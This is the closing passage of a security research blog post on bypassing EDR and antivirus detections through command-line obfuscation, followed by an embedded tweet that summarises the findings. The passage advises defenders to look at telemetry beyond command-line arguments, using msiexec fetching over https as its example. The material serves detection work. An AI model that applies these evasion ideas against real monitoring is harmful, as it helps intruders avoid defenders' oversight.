<p>Finally, a key recommendation is to avoid relying on command-line arguments where possible. For the avoidance of doubt: there is nothing wrong with writing detections that target command-line arguments, as it will successfully identify lots of potentially malicious behaviour. However, as this research and other research has demonstrated, command lines can be spoofed, altered or otherwise manipulated in ways that can bypass detections. Where possible, a more reliable alternative is focussing on other events present in <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> telemetry that cannot easily be spoofed; for example, instead of looking for <code class="language-plaintext highlighter-rouge">msiexec.exe</code> specifying <code class="language-plaintext highlighter-rouge">https://</code> on the command line, consider looking for external network connections originating from <code class="language-plaintext highlighter-rouge">msiexec</code>.</p>


            <div class="post_date">Posted on 2025-03-24</div>
        </article>

        <div class="container"><hr>
          <div id="tweet" data-tweetid="1904097884124971407"><div class="twitter-tweet twitter-tweet-rendered" style="display: flex; max-width: 550px; width: 100%; margin-top: 10px; margin-bottom: 10px;"><div id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="" title="X Post" src="https://platform.twitter.com/embed/Tweet.html?creatorScreenName=Wietze&amp;dnt=true&amp;embedId=twitter-widget-0&amp;features=eyJ0ZndfdGltZWxpbmVfbGlzdCI6eyJidWNrZXQiOltdLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X2ZvbGxvd2VyX2NvdW50X3N1bnNldCI6eyJidWNrZXQiOnRydWUsInZlcnNpb24iOm51bGx9LCJ0ZndfdHdlZXRfZWRpdF9iYWNrZW5kIjp7ImJ1Y2tldCI6Im9uIiwidmVyc2lvbiI6bnVsbH0sInRmd19yZWZzcmNfc2Vzc2lvbiI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9LCJ0ZndfZm9zbnJfc29mdF9pbnRlcnZlbnRpb25zX2VuYWJsZWQiOnsiYnVja2V0Ijoib24iLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X21peGVkX21lZGlhXzE1ODk3Ijp7ImJ1Y2tldCI6InRyZWF0bWVudCIsInZlcnNpb24iOm51bGx9LCJ0ZndfZXhwZXJpbWVudHNfY29va2llX2V4cGlyYXRpb24iOnsiYnVja2V0IjoxMjA5NjAwLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X3Nob3dfYmlyZHdhdGNoX3Bpdm90c19lbmFibGVkIjp7ImJ1Y2tldCI6Im9uIiwidmVyc2lvbiI6bnVsbH0sInRmd19kdXBsaWNhdGVfc2NyaWJlc190b19zZXR0aW5ncyI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9LCJ0ZndfdXNlX3Byb2ZpbGVfaW1hZ2Vfc2hhcGVfZW5hYmxlZCI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9LCJ0ZndfdmlkZW9faGxzX2R5bmFtaWNfbWFuaWZlc3RzXzE1MDgyIjp7ImJ1Y2tldCI6InRydWVfYml0cmF0ZSIsInZlcnNpb24iOm51bGx9LCJ0ZndfbGVnYWN5X3RpbWVsaW5lX3N1bnNldCI6eyJidWNrZXQiOnRydWUsInZlcnNpb24iOm51bGx9LCJ0ZndfdHdlZXRfZWRpdF9mcm9udGVuZCI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9fQ%3D%3D&amp;frame=false&amp;hideCard=false&amp;hideThread=true&amp;id=1904097884124971407&amp;lang=en&amp;origin=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&amp;sessionId=88dc28dbfefbe3e37aad628db952795791709324&amp;theme=light&amp;widgetsVersion=2615f7e52b7e0%3A1702314776716&amp;width=550px" style="position: static; visibility: visible; width: 550px; height: 688px; display: block; flex-grow: 1;" data-tweet-id="1904097884124971407" data-original-tag="iframe"><title>Twitter Embed</title><div id="app"><div class="css-1dbjc4n r-13awgt0 r-12vffkv"><div class="css-1dbjc4n r-13awgt0 r-12vffkv"><div class="css-1dbjc4n r-1ets6dv r-1q9bdsx r-rs99b7 r-1loqt21 r-vakc41 r-y54riw r-1udh08x"><div tabindex="0"></div><article role="article" tabindex="0" class="css-1dbjc4n r-14lw9ot r-1ny4l3l r-iphfwy r-1qhn6m8 r-i023vh r-ttdzmv r-o7ynqc r-6416eg"><a href="https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" aria-label="Visit this post on X" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21"></a><div class="css-1dbjc4n r-18u37iz r-kzbkwu"><div class="css-1dbjc4n r-1ny4l3l"><div class="css-1dbjc4n r-1adg3ll r-bztko3" data-testid="UserAvatar-Container-Wietze" style="height: 48px; width: 48px;"><div class="r-1adg3ll r-13qz1uu" style="padding-bottom: 100%;"></div><div class="r-1p0dtai r-1pi2tsx r-1d2f490 r-u8s1d r-ipm5af r-13qz1uu"><div class="css-1dbjc4n r-1adg3ll r-1pi2tsx r-1wyvozj r-bztko3 r-u8s1d r-1v2oles r-desppf r-13qz1uu"><div class="r-1adg3ll r-13qz1uu" style="padding-bottom: 100%;"></div><div class="r-1p0dtai r-1pi2tsx r-1d2f490 r-u8s1d r-ipm5af r-13qz1uu"><div class="css-1dbjc4n r-sdzlij r-ggadg3 r-1udh08x r-u8s1d r-8jfcpp" style="height: calc(100% + 4px); width: calc(100% + 4px);"><a href="https://twitter.com/Wietze?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" aria-hidden="true" role="link" tabindex="-1" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-1pi2tsx r-1ny4l3l r-o7ynqc r-6416eg r-13qz1uu" style="background-color: rgba(0, 0, 0, 0);"><div class="css-1dbjc4n r-sdzlij r-1wyvozj r-1udh08x r-633pao r-u8s1d r-1v2oles r-desppf" style="height: calc(100% - 4px); width: calc(100% - 4px);"><div class="css-1dbjc4n r-1pi2tsx r-13qz1uu" style="background-color: rgba(0, 0, 0, 0);"></div></div><div class="css-1dbjc4n r-sdzlij r-1wyvozj r-1udh08x r-633pao r-u8s1d r-1v2oles r-desppf" style="height: calc(100% - 4px); width: calc(100% - 4px);"><div class="css-1dbjc4n r-14lw9ot r-1pi2tsx r-13qz1uu"></div></div><div class="css-1dbjc4n r-14lw9ot r-sdzlij r-1wyvozj r-1udh08x r-633pao r-u8s1d r-1v2oles r-desppf" style="height: calc(100% - 4px); width: calc(100% - 4px);"><div class="css-1dbjc4n r-1adg3ll r-1udh08x" style=""><div class="r-1adg3ll r-13qz1uu" style="padding-bottom: 100%;"></div><div class="r-1p0dtai r-1pi2tsx r-1d2f490 r-u8s1d r-ipm5af r-13qz1uu"><div aria-label="" class="css-1dbjc4n r-1p0dtai r-1mlwlqe r-1d2f490 r-1udh08x r-u8s1d r-zchlnj r-ipm5af r-417010" style=""><div class="css-1dbjc4n r-1niwhzg r-vvn4in r-u6sd8q r-4gszlv r-1p0dtai r-1pi2tsx r-1d2f490 r-u8s1d r-zchlnj r-ipm5af r-13qz1uu r-1wyyakw" style="background-image: url(&quot;https://pbs.twimg.com/profile_images/1585190820319268865/FfTaeq3Z_normal.jpg&quot;);"></div><img alt="" draggable="true" src="https://pbs.twimg.com/profile_images/1585190820319268865/FfTaeq3Z_normal.jpg" class="css-9pa8cd"></div></div></div></div><div class="css-1dbjc4n r-sdzlij r-1wyvozj r-1udh08x r-u8s1d r-1v2oles r-desppf" style="height: calc(100% - 4px); width: calc(100% - 4px);"><div class="css-1dbjc4n r-12181gd r-1pi2tsx r-1ny4l3l r-o7ynqc r-6416eg r-13qz1uu"></div></div></a></div></div></div></div></div></div><div class="css-1dbjc4n r-eqz5dr r-1777fci r-4amgru r-1kh6xel"><div class="css-1dbjc4n r-1ny4l3l"><div class="css-1dbjc4n r-1wbh5a2 r-dnmrzs r-1ny4l3l"><div class="css-1dbjc4n r-1wbh5a2 r-dnmrzs r-1ny4l3l"><a href="https://twitter.com/Wietze?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-1wbh5a2 r-dnmrzs r-1ny4l3l"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-dnmrzs"><div dir="auto" class="css-901oao r-1awozwy r-6koalj r-1qd0xha r-a023e6 r-b88u0q r-rjixqe r-bcqeeo r-1udh08x r-3s2u2q r-qvutc0" style="color: rgb(15, 20, 25);"><span class="css-901oao css-16my406 css-1hf3ou5 r-poiln3 r-bcqeeo r-qvutc0"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">Wietze</span><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-1pos5eu r-qvutc0"></span></span></div><div dir="auto" class="css-901oao r-xoduu5 r-18u37iz r-1q142lx r-1qd0xha r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-qvutc0" style="color: rgb(15, 20, 25);"><span class="css-901oao css-16my406 r-1awozwy r-xoduu5 r-poiln3 r-bcqeeo r-qvutc0"></span></div></div></a><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1wbh5a2"><a href="https://twitter.com/Wietze?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" role="link" tabindex="-1" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-1wbh5a2 r-dnmrzs r-1ny4l3l"><div class="css-1dbjc4n"><div dir="ltr" class="css-901oao css-1hf3ou5 r-18u37iz r-1qd0xha r-1wvb978 r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-qvutc0" style="color: rgb(83, 100, 113);"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">@Wietze</span></div></div></a><div class="css-1dbjc4n r-18u37iz r-1q142lx"><div dir="auto" aria-hidden="true" class="css-901oao r-1q142lx r-1qd0xha r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-s1qlax r-qvutc0" style="color: rgb(83, 100, 113);"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">¬∑</span></div><a href="https://twitter.com/intent/follow?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&amp;screen_name=Wietze" dir="auto" rel="noopener noreferrer nofollow" target="_blank" role="link" class="css-4rbku5 css-18t94o4 css-901oao r-1loqt21 r-1qd0xha r-a023e6 r-b88u0q r-rjixqe r-bcqeeo r-qvutc0" style="color: rgb(0, 111, 214);"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">Follow</span></a></div></div></div></div></div></div><a href="https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" aria-label="View on X" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-sdzlij r-1loqt21 r-1jj8364 r-1ny4l3l r-o7ynqc r-6416eg"><svg viewBox="0 0 24 24" aria-hidden="true" class="r-18jsvk2 r-4qtqp9 r-yyyyoo r-6zzn7w r-19fsva8 r-dnmrzs r-bnwqim r-1plcrui r-lrvibr r-q1j0wu"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg></a></div><div class="css-1dbjc4n"><div dir="auto" lang="en" class="css-901oao r-18jsvk2 r-1dqbpge r-1qd0xha r-adyw6z r-16dba41 r-135wba7 r-bcqeeo r-bnwqim r-qvutc0" data-testid="tweetText"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">By making minor changes to command-line arguments, it is possible to bypass EDR/AV detections.

My research, comprising ~70 Windows executables, found that all of them were vulnerable to this, to varying degrees.

Here‚Äôs what I found and why it matters </span><img alt="üëâ" draggable="false" src="https://abs-0.twimg.com/emoji/v2/svg/1f449.svg" class="r-4qtqp9 r-dflpy8 r-sjv1od r-zw8f10 r-10akycc r-h9hxbl" width="24" height="24"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0"> </span><a dir="ltr" href="https://wietze.github.io/blog/bypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" role="link" class="css-4rbku5 css-18t94o4 css-901oao css-16my406 r-1loqt21 r-poiln3 r-bcqeeo r-qvutc0" style="color: rgb(0, 111, 214);"><span aria-hidden="true" class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0">https://</span>wietze.github.io/blog/bypassing<span aria-hidden="true" class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0">-detections-with-command-line-obfuscation</span><span aria-hidden="true" class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-lrvibr r-qvutc0">‚Ä¶</span></a></div></div><div class="css-1dbjc4n r-1ets6dv r-1q9bdsx r-1phboty r-rs99b7 r-1s2bzr4 r-1udh08x"><div class="css-1dbjc4n"><a href="https://x.com/Wietze/status/1904097884124971407/photo/1" rel="noopener noreferrer nofollow" target="_blank" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-1pi2tsx r-1ny4l3l"><div class="css-1dbjc4n r-1adg3ll r-1udh08x" style=""><div class="r-1adg3ll r-13qz1uu" style="padding-bottom: 50%;"></div><div class="r-1p0dtai r-1pi2tsx r-1d2f490 r-u8s1d r-ipm5af r-13qz1uu"><div aria-label="Image" class="css-1dbjc4n r-1p0dtai r-1mlwlqe r-1d2f490 r-1udh08x r-u8s1d r-zchlnj r-ipm5af r-417010" style="margin: 0px;"><div class="css-1dbjc4n r-1niwhzg r-vvn4in r-u6sd8q r-4gszlv r-1p0dtai r-1pi2tsx r-1d2f490 r-u8s1d r-zchlnj r-ipm5af r-13qz1uu r-1wyyakw" style="background-image: url(&quot;https://pbs.twimg.com/media/Gmy2728W8AAIG53?format=jpg&amp;name=small&quot;);"></div><img alt="Image" draggable="true" src="https://pbs.twimg.com/media/Gmy2728W8AAIG53?format=jpg&amp;name=small" class="css-9pa8cd"></div></div></div></a></div></div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1bymd8e"><div dir="auto" class="css-901oao css-1hf3ou5 r-18jsvk2 r-1qd0xha r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-qvutc0"><div class="css-1dbjc4n r-xoduu5"><div class="css-1dbjc4n r-1d09ksm r-1471scf r-18u37iz r-1wbh5a2"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0" style="color: rgb(83, 100, 113);"><a href="https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" aria-label="9:08 AM ¬∑ Mar 24, 2025" role="link" class="css-4rbku5 css-18t94o4 css-901oao css-16my406 r-1loqt21 r-xoduu5 r-1q142lx r-1w6e6rj r-poiln3 r-9aw3ui r-bcqeeo r-3s2u2q r-qvutc0" style="color: rgb(83, 100, 113);"><time datetime="2025-03-24T09:08:06.000Z">9:08 AM ¬∑ Mar 24, 2025</time></a></span></div></div></div><a href="https://help.twitter.com/en/twitter-for-websites-ads-info-and-privacy" rel="noopener noreferrer nofollow" target="_blank" aria-label="X Ads info and privacy" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-sdzlij r-1loqt21 r-mabqd8 r-1777fci r-1jj8364 r-2eo2mk r-1ny4l3l r-o7ynqc r-6416eg r-1yvhtrz"><svg viewBox="0 0 24 24" aria-hidden="true" class="r-14j79pv r-4qtqp9 r-yyyyoo r-1xvli5t r-dnmrzs r-bnwqim r-1plcrui r-lrvibr"><g><path d="M13.5 8.5c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5S11.17 7 12 7s1.5.67 1.5 1.5zM13 17v-5h-2v5h2zm-1 5.25c5.66 0 10.25-4.59 10.25-10.25S17.66 1.75 12 1.75 1.75 6.34 1.75 12 6.34 22.25 12 22.25zM20.25 12c0 4.56-3.69 8.25-8.25 8.25S3.75 16.56 3.75 12 7.44 3.75 12 3.75s8.25 3.69 8.25 8.25z"></path></g></svg></a></div><div class="css-1dbjc4n r-1habvwh r-1ets6dv r-5kkj8d r-18u37iz r-14gqq1x r-1h8ys4a"><a href="https://twitter.com/intent/like?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&amp;tweet_id=1904097884124971407" rel="noopener noreferrer nofollow" target="_blank" aria-label="Like. This post has 795 likes" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1awozwy r-1loqt21 r-18u37iz r-1mf7evn r-1ny4l3l r-o7ynqc r-6416eg"><div tabindex="-1" class="css-1dbjc4n r-sdzlij r-mabqd8 r-1777fci r-cnkkqs r-1yvhtrz"><svg viewBox="0 0 24 24" aria-hidden="true" class="r-vkub15 r-4qtqp9 r-1sreavd r-1xvli5t r-dnmrzs r-bnwqim r-1plcrui r-lrvibr"><g><path d="M20.884 13.19c-1.351 2.48-4.001 5.12-8.379 7.67l-.503.3-.504-.3c-4.379-2.55-7.029-5.19-8.382-7.67-1.36-2.5-1.41-4.86-.514-6.67.887-1.79 2.647-2.91 4.601-3.01 1.651-.09 3.368.56 4.798 2.01 1.429-1.45 3.146-2.1 4.796-2.01 1.954.1 3.714 1.22 4.601 3.01.896 1.81.846 4.17-.514 6.67z"></path></g></svg></div><div dir="auto" class="css-901oao css-1hf3ou5 r-14j79pv r-1qd0xha r-1b43r93 r-b88u0q r-1cwl3u0 r-13hce6t r-bcqeeo r-qvutc0"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">795</span></div></a><a href="https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&amp;in_reply_to=1904097884124971407" rel="noopener noreferrer nofollow" target="_blank" aria-label="Reply to this post on X" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1awozwy r-1loqt21 r-18u37iz r-1mf7evn r-1ny4l3l r-o7ynqc r-6416eg"><div tabindex="-1" class="css-1dbjc4n r-sdzlij r-mabqd8 r-1777fci r-1yvhtrz"><svg viewBox="0 0 24 24" aria-hidden="true" class="r-1cvl2hr r-4qtqp9 r-4r3dic r-1xvli5t r-dnmrzs r-bnwqim r-1plcrui r-lrvibr"><g><path d="M1.751 10c0-4.42 3.584-8 8.005-8h4.366c4.49 0 8.129 3.64 8.129 8.13 0 2.96-1.607 5.68-4.196 7.11l-8.054 4.46v-3.69h-.067c-4.49.1-8.183-3.51-8.183-8.01z"></path></g></svg></div><div dir="auto" class="css-901oao css-1hf3ou5 r-14j79pv r-1qd0xha r-1b43r93 r-b88u0q r-1cwl3u0 r-13hce6t r-bcqeeo r-qvutc0"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">Reply</span></div></a><div role="button" tabindex="0" class="css-18t94o4 css-1dbjc4n r-1awozwy r-18u37iz r-1wbh5a2 r-1ny4l3l r-o7ynqc r-6416eg"><div tabindex="-1" class="css-1dbjc4n r-sdzlij r-mabqd8 r-1777fci r-cnkkqs r-1yvhtrz"><svg viewBox="0 0 24 24" aria-hidden="true" class="r-14j79pv r-4qtqp9 r-yyyyoo r-1xvli5t r-dnmrzs r-bnwqim r-1plcrui r-lrvibr"><g><path d="M18.36 5.64c-1.95-1.96-5.11-1.96-7.07 0L9.88 7.05 8.46 5.64l1.42-1.42c2.73-2.73 7.16-2.73 9.9 0 2.73 2.74 2.73 7.17 0 9.9l-1.42 1.42-1.41-1.42 1.41-1.41c1.96-1.96 1.96-5.12 0-7.07zm-2.12 3.53l-7.07 7.07-1.41-1.41 7.07-7.07 1.41 1.41zm-12.02.71l1.42-1.42 1.41 1.42-1.41 1.41c-1.96 1.96-1.96 5.12 0 7.07 1.95 1.96 5.11 1.96 7.07 0l1.41-1.41 1.42 1.41-1.42 1.42c-2.73 2.73-7.16 2.73-9.9 0-2.73-2.74-2.73-7.17 0-9.9z"></path></g></svg></div><div dir="auto" class="css-901oao css-1hf3ou5 r-14j79pv r-1qd0xha r-1b43r93 r-b88u0q r-1cwl3u0 r-13hce6t r-bcqeeo r-qvutc0"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">Copy link</span></div></div></div><div class="css-1dbjc4n r-kzbkwu r-1h8ys4a"><a href="https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation" rel="noopener noreferrer nofollow" target="_blank" role="link" class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1ets6dv r-sdzlij r-1phboty r-rs99b7 r-1loqt21 r-15ysp7h r-4wgw6l r-1ny4l3l r-ymttw5 r-o7ynqc r-6416eg r-lrvibr" style="background-color: rgba(0, 0, 0, 0);"><div dir="auto" class="css-901oao r-1awozwy r-6koalj r-18u37iz r-16y2uox r-1qd0xha r-a023e6 r-b88u0q r-1777fci r-rjixqe r-bcqeeo r-q4m81j r-qvutc0" style="color: rgb(0, 111, 214);"><span class="css-901oao css-16my406 css-1hf3ou5 r-poiln3 r-1b43r93 r-1cwl3u0 r-bcqeeo r-qvutc0"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">Read 10 replies</span></span></div></a></div></article></div></div></div></div><div style="width: 0px; height: 0px;"></div></div></div></div>
        </div>

        
        

        
    </main>



<div scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.2f70fb173b9000da126c79afe2098f02.html?origin=https%3A%2F%2Fwww.wietzebeukema.nl" title="Twitter settings iframe" style="display: none;" data-original-tag="iframe">
<title>Twitter Widget Iframe</title>



</div><div id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;" title="Twitter analytics iframe" data-original-tag="iframe"></div></body></html>